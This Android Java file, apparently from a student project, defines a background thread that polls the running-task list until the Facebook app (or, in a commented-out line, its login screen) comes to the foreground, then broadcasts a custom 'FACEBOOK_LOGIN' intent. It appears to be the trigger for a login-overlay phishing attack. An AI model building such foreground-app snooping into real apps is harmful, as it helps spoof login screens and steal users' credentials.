package com.www.pongers_263;

import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.os.Looper;
import android.util.Log;

import java.util.List;

/**
 * Created by winniewu on 11/27/15.
 */
public class Daemon extends Thread {

        ActivityManager am = null;
        Context context = null;

        public Daemon(Context con){
            context = con;
            am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        }

        public void run(){
            Looper.prepare();

            while(true){
                // Return a list of the tasks that are currently running,
                // with the most recent being first and older ones after in order.
                // Taken 1 inside getRunningTasks method means want to take only
                // top activity from stack and forgot the olders.
                List< ActivityManager.RunningTaskInfo > runningTasks = am.getRunningTasks(1);

                if ("com.facebook.katana".equals(runningTasks.get(0).topActivity.getPackageName())) {
//                if ("com.facebook.katana/com.facebook.katana.FacebookLoginActivity".equals(runningTasks.get(0).topActivity.flattenToString())) {
                    Log.e("www", "facebook running");
                    break;
                }
            }
            Intent intent = new Intent();
            intent.setAction("com.www.pongers_263.FACEBOOK_LOGIN");
            context.sendBroadcast(intent);
            Looper.loop();
        }
    }
